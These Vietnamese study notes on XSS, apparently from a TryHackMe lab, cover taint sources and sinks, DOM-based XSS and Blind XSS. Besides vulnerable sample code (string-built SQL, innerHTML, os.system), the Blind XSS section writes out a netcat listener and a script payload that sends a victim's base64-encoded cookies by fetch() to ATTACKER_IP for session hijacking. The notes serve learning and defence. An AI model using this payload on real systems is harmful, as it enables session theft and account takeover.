### 📥 Sources (Nguồn) — Nơi Data Tainted Xuất Hiện

```
Source = Điểm dữ liệu KHÔNG ĐÁNG TIN CẬY
         xuất hiện/nhập vào ứng dụng

Phân loại:
├── Dữ liệu từ USER
│   ├── Form inputs
│   ├── URL query parameters
│   └── Cookies
│
├── Dữ liệu từ HỆ THỐNG BÊN NGOÀI
│   ├── API responses
│   ├── GET/POST requests
│   └── Database không tin cậy
│
└── Dữ liệu từ ĐỐI TƯỢNG KHÔNG XÁC ĐỊNH
    ├── HTTP headers (User-Agent, Referer)
    └── Có thể bị attacker giả mạo
```

**Ví dụ cụ thể:**

javascript

```javascript
// URL parameter
?userInput=<script>alert('xss')</script>

// Form input
username = "<malicious code>"

// Cookies
document.cookie  // Nếu không validate

// HTTP headers
User-Agent: "<script>..."  // Có thể bị giả mạo
```

---

### 📤 Sinks (Điểm Đích) — Nơi Data Tainted Gây Hại

```
Sink = Điểm trong ứng dụng nơi data tainted
       được SỬ DỤNG mà không kiểm tra
       → Dẫn đến THỰC THI mã độc

3 loại Sink nguy hiểm chính:

1. SQL STATEMENTS
   └── Data tainted → SQL query không tham số hóa
       → SQL INJECTION

2. HTML/JAVASCRIPT
   └── Data tainted → Insert trực tiếp vào page
       → XSS (Cross-Site Scripting)

3. SYSTEM COMMANDS
   └── Data tainted → Lệnh hệ thống
       → COMMAND INJECTION
```

**Ví dụ code minh họa:**

javascript

```javascript
// SQL Injection sink
var query = "SELECT * FROM users WHERE name = '" + userInput + "'";
executeQuery(query);
//            ↑ userInput KHÔNG được sanitize trước khi vào query

// XSS sink
document.getElementById('user-name').innerHTML = userInput;
//                                    ↑ innerHTML = dangerous sink

// Command Injection sink
os.system("ping " + userInput);
//          ↑ userInput trực tiếp vào system command
```

---

### 🔄 Mối Quan Hệ Source → Sink

```
SOURCE                    SINK
(Tainted data)    →→→    (Dangerous usage)

User input              SQL query
URL parameter            HTML rendering
Cookie value             System command
HTTP header               eval()

→ Nếu KHÔNG có "kiểm tra" (sanitization)
  giữa Source và Sink
  → VULNERABILITY xuất hiện!
```

---

### 🎯 Ví Dụ Hoàn Chỉnh Taint Flow

html

```html
<!-- Client: Form nhập username -->
<form action="/welcome" method="POST">
  <input type="text" name="username">
  <input type="submit" value="Submit">
</form>
```

javascript

```javascript
// Server-side code
var userInput = request.body.username;  // ← SOURCE
response.send("<h1>Welcome, " + userInput + "!</h1>");  // ← SINK
```

**Phân tích Taint Flow:**

```
1. SOURCE: request.body.username
   └── Dữ liệu từ user, CHƯA ĐÁNG TIN CẬY

2. TAINT FLOW: userInput → response.send()
   └── KHÔNG có bước escape/sanitize ở giữa!

3. SINK: response.send("...")
   └── Data được insert TRỰC TIẾP vào HTML

ATTACKER EXPLOIT:
Input: <script>alert('XSS')</script>
Output: <h1>Welcome, <script>alert('XSS')</script>!</h1>
                      ↑
            Script CHẠY trong browser victim!
```

---

### 📋 Danh Sách Sources Điển Hình

```
DOM/Browser Sources:
├── document.URL
├── document.documentURI
├── document.URLUnencoded
├── document.baseURI
├── location (href, hash, search...)
├── document.cookie
├── document.referrer
└── window.name

Storage Sources:
├── localStorage
├── sessionStorage
└── IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)

History Sources:
├── history.pushState
└── history.replaceState

Other:
└── Database (nếu chứa unvalidated data)
```

---

### 📋 Danh Sách Sinks Điển Hình

```
DOM Manipulation Sinks:
├── document.write()
├── element.innerHTML (qua setAttribute hoặc trực tiếp)
├── document.evaluate()
└── element.setAttribute()

Code Execution Sinks:
├── eval()
└── RegExp()

Navigation/Redirect Sinks:
├── window.location
└── document.domain

Network Sinks:
├── WebSocket()
├── postMessage()
└── setRequestHeader()

Storage Sinks:
├── document.cookie (write)
└── sessionStorage.setItem()

File/Data Sinks:
├── FileReader.readAsText()
├── ExecuteSql()
└── JSON.parse()

Resource Loading:
└── element.src
```
## 🔍 Cơ Chế DOM-Based XSS

```
SOURCES (Nơi data đến từ):
├── URL
├── location.hash      (#fragment)
├── location.search     (?query)
├── document.referrer
└── localStorage

         ↓ JavaScript đọc data

SINKS (Nơi data được ghi vào - NGUY HIỂM):
├── innerHTML
├── document.write
├── eval
└── (Nhiều dangerous functions khác)

         ↓

Browser PARSE + EXECUTE payload
→ Không cần server xử lý gì cả!
```

---

## ⚡ Đặc Điểm Quan Trọng Nhất

```
REFLECTED/STORED XSS:
Browser → Server (request) → Server xử lý
→ Server render → Browser nhận → Execute

DOM-BASED XSS:
Browser → JavaScript đọc DOM trực tiếp
→ JavaScript ghi vào DOM trực tiếp
→ Execute NGAY trong browser

⚠️ KHÔNG CÓ BƯỚC NÀO ĐI QUA SERVER!
→ Server-side escaping/sanitization
  HOÀN TOÀN VÔ DỤNG!
```

---

## 🧪 Thực Hành — News Preview Page

```
Truy cập: http://MACHINE_IP:5000/dom

Payload test:
<img src=x onerror="alert('Hacked you again')">

Phân tích payload:
├── <img src=x>     → src không hợp lệ ("x" không phải URL)
│                       → Browser FAIL load ảnh
├── onerror=...     → Event handler TRIGGER khi load FAIL
└── alert(...)      → JavaScript code thực thi

Flow:
1. Nhập payload vào "Manual preview" form
2. Click "Preview"
3. JavaScript (client-side) lấy input
4. Ghi vào DOM bằng innerHTML (KHÔNG sanitize)
5. Browser parse <img> tag
6. src="x" load FAIL → onerror trigger
7. alert() chạy → Popup xuất hiện! ✅
```

---

## 🎯 Tại Sao Dùng `<img onerror>` Thay Vì `<script>`?

```
LƯU Ý KỸ THUẬT QUAN TRỌNG:

Khi inject qua innerHTML:
element.innerHTML = '<script>alert(1)</script>'

→ <script> tag KHÔNG TỰ ĐỘNG CHẠY
  khi insert qua innerHTML!
  (Đây là browser security behavior)

NHƯNG:
element.innerHTML = '<img src=x onerror="alert(1)">'

→ Event handlers (onerror, onload...) 
  VẪN HOẠT ĐỘNG bình thường!
  → Đây là lý do payload dùng <img onerror>
    thay vì <script> trực tiếp
```

---

## 🔍 Root Cause Chi Tiết

javascript

```javascript
// Code có lỗi (giả định trong dom_preview.html)

// 1. SOURCE: Đọc data từ URL fragment
const userInput = location.hash.substring(1);
// hoặc từ form input trực tiếp

// 2. SINK: Ghi trực tiếp vào DOM (NGUY HIỂM!)
document.getElementById('preview').innerHTML = userInput;
//                                    ↑
//                              KHÔNG sanitize!
//                              Treat input như HTML thật

// → Browser parse HTML này
// → <img onerror=...> trigger
// → alert() chạy!
```

---

#### 📊 So Sánh 3 Loại XSS

|                                   | Reflected        | Stored                 | DOM-based       |
| --------------------------------- | ---------------- | ---------------------- | --------------- |
| **Payload qua server?**           | ✅ Có            | ✅ Có                  | ❌ KHÔNG        |
| **Lưu trữ?**                      | ❌ Không         | ✅ Có                  | ❌ Không        |
| **Server-side escape giúp được?** | ✅ Có            | ✅ Có                  | ❌ KHÔNG!       |
| **Chỗ tìm lỗi**                   | Server code      | Server code (khi save) | Client-side JS  |
| **Detect bằng cách nào**          | View page source | View page source       | Cần đọc JS code |

---

## ⚠️ Tại Sao Server-Side Defense Vô Dụng?

```
Reflected XSS — Server escape giúp:
Server nhận input → escape() → Render
                    ↑
              Defense ở ĐÂY có tác dụng

DOM-based XSS — Server escape KHÔNG giúp:
Browser đọc location.hash → JS xử lý → innerHTML
        ↑                                ↑
   KHÔNG bao giờ                   Lỗ hổng ở ĐÂY
   gửi đến server!                 (Client-side!)

→ Dù server có escape() hoàn hảo
  CŨNG KHÔNG NGĂN ĐƯỢC DOM-based XSS
  Vì server KHÔNG BAO GIỜ thấy data này!
```

---

## 🛡️ Dangerous Sinks Cần Tránh

|Sink|Nguy Hiểm|An Toàn Hơn|
|---|---|---|
|`innerHTML`|✅ Parse HTML, execute scripts/events|`textContent`|
|`document.write()`|✅ Ghi trực tiếp vào page|Tránh dùng hoàn toàn|
|`eval()`|✅ Execute string như code|`JSON.parse()`|
|`outerHTML`|✅ Giống innerHTML|`textContent`|
|`setAttribute('onclick', ...)`|✅ Tạo event handler|Dùng `addEventListener`|
# Blind XSS
- **Blind XSS** tương tự Stored XSS ở chỗ payload được lưu trữ trên website cho user khác xem, nhưng điểm khác biệt cốt lõi là **attacker không thể tự test payload trên chính mình** — payload chỉ "kích hoạt" khi một user khác (thường là staff/admin) xem nội dung ở một private portal mà attacker không có quyền truy cập.
## 🔍 Blind XSS Là Gì?

```
SO SÁNH VỚI STORED XSS:

Stored XSS:
└── Attacker SUBMIT payload
└── Attacker CÓ THỂ xem kết quả ngay
    (vd: comment hiện công khai)

Blind XSS:
└── Attacker SUBMIT payload
└── Attacker KHÔNG THỂ xem kết quả
    (Payload nằm ở PRIVATE PORTAL
     chỉ staff/admin mới truy cập được)

→ Attacker "MÙ" về việc payload
  có chạy thành công hay không!
```

---

## 🎯 Kịch Bản Thực Tế

```
Contact Form / Support Ticket System

User (Attacker) gửi message
         ↓
Message KHÔNG được validate
         ↓
Lưu thành Support Ticket
         ↓
Staff member xem ticket trên PRIVATE PORTAL
         ↓
Payload CHẠY trong browser của STAFF
         ↓
JavaScript gửi data về server của attacker
         ↓
Attacker nhận: Staff portal URL, cookies, page contents
         ↓
HIJACK staff session → Truy cập private portal!
```

---

## ✅ Cách Test Blind XSS

```
KEY POINT: Payload PHẢI có CALLBACK
└── Vì attacker không thấy được kết quả trực tiếp
    → Cần cơ chế để BIẾT payload đã chạy

Callback thường là HTTP request về server của attacker

Tools hỗ trợ:
└── XSS Hunter Express
    → Tự động capture:
       ├── Cookies
       ├── URLs
       └── Page contents
```

---

## 🧪 Thực Hành Từng Bước

### Bước 1: Tìm Vị Trí Reflect Trong HTML

```html
<!-- Page source cho thấy input nằm trong textarea -->
<textarea>test</textarea>
           ↑
    Input của user nằm TRONG đây
```

### Bước 2: Escape Khỏi Textarea

```html
Payload: </textarea>test

Kết quả:
<textarea></textarea>test
           ↑
    Đã ĐÓNG textarea thành công!
    "test" giờ nằm NGOÀI textarea
```

### Bước 3: Confirm XSS Với alert()

```html
Payload: </textarea><script>alert('THM');</script>

Kết quả:
<textarea></textarea><script>alert('THM');</script>

→ Khi xem ticket → Popup "THM" xuất hiện ✅
→ XÁC NHẬN: XSS vulnerability tồn tại!
```

---

### 💀 Escalate: Cookie Extraction

#### Setup Listener (AttackBox)

bash

```bash
nc -nlvp 9001

# Giải thích flags:
# -l → Listen mode
# -n → Không resolve DNS hostnames
# -v → Verbose output
# -p → Specify port number
```

#### Payload Hoàn Chỉnh

html

```html
</textarea><script>
fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie));
</script>
```

**Phân Tích Từng Phần:**

```
</textarea>
└── Đóng textarea field (escape context)

<script>...</script>
└── Mở khối JavaScript

fetch(...)
└── Gửi HTTP request

URL_OR_IP:PORT_NUMBER
└── Server của attacker (AttackBox IP/THM Request Catcher)

?cookie=
└── Query string chứa cookie value

btoa(document.cookie)
├── document.cookie → Lấy cookies của VICTIM
│                      (Trong context của Acme IT Support)
└── btoa() → Base64 encode
            (An toàn để truyền qua URL)

</script>
└── Đóng khối JavaScript
```

---

### 🔄 Attack Flow Hoàn Chỉnh

```
BƯỚC 1: Setup listener
nc -nlvp 9001

BƯỚC 2: Tạo ticket mới với payload
Ticket Subject: </textarea><script>fetch('http://ATTACKER_IP:9001?cookie=' + btoa(document.cookie));</script>

BƯỚC 3: CHỜ ĐỢI (lên đến 1 phút)
└── Staff member xem ticket
    → Payload TỰ ĐỘNG chạy trong browser của họ
    → fetch() gửi request về AttackBox

BƯỚC 4: Nhận request trên Netcat listener
└── Request chứa: ?cookie=BASE64_ENCODED_COOKIE

BƯỚC 5: Decode Base64
└── Dùng base64decode.org
    → Lấy được raw cookie value

BƯỚC 6: Session Hijacking
└── Dùng cookie đó → Impersonate staff member
    → Truy cập PRIVATE PORTAL!
```

---

### ⚠️ Lưu Ý Quan Trọng Trong Lab

```
"You may encounter issues with receiving
 the request using your own VM and VPN"

→ Khuyến nghị dùng AttackBox
  (Network configuration ổn định hơn
   cho việc nhận callback)
```